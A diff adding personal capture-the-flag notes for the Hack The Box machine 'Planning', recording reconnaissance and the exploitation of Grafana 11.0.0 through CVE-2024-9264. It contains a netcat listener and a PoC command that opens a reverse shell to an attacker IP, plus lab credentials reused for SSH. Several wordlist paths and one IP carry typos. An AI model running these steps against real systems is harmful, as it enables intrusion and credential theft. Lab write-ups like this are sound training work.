@@ -1,0 +1,32 @@
+HTB Planning:
+
+IP Addr: 10.10.11.68
+nmap -sV -A 10.10.11.68 -o nmap.txt
+	-> open ports: 22, 80
+	-> OS: MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) - seems to have vulnerability
+
+updated /etc/hosts 10.10.11.68 planning.htb - found website "EDUKATE" - .../index.php
+sudo nmap 10.10.11.68 --script=http-enum
+	-> nothing interesting
+	
+nikto -host 10.10.11.69
+	-> nginx/1.24.0 (Ubuntu), Root-page / redirects to http://planning.htb/
+	-> no additional items found - checked manually for /admin /admin.php /robots.txt /login.php
+
+ffuf -w /usr/share/wordlists/seclists/Discovrey/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.68/FUZZ -t 50 -mc 200,403
+	-> nothing!
+	
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/direcotry-list-2.3-medium.txt -u http://10.10.11.68/FUZZ -e .php,.txt,.bak -t 40 -mc 200
+	-> nothing!
+
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DNS/namelist.txt -u http://planning.htb -H "Host:FUZZ.planning.htb" -fs 178
+	-> found grafana.planning.htb, added to /etc/hosts
+	-> login with provided admin credentials (machine info)
+
+Grafana 11.0.0 -> vulnerability found, CVE-2024-9264-RCE-Exploit, downloaded poc.py from github, nc -lnvp 9001 and use python exploit.
+	-> python3 poc.py --url http://grafana.planning.htb --username admin --password:0D5oT70Fq13EvB5r --reverse-ip 10.10.14.5 --reverse-port 9001
+
+reverse shell into docker container - found credentials in environment variable (env)
+ssh-login enzo/RioTecRANDEntANT!
+	-> found user.txt flag.
+
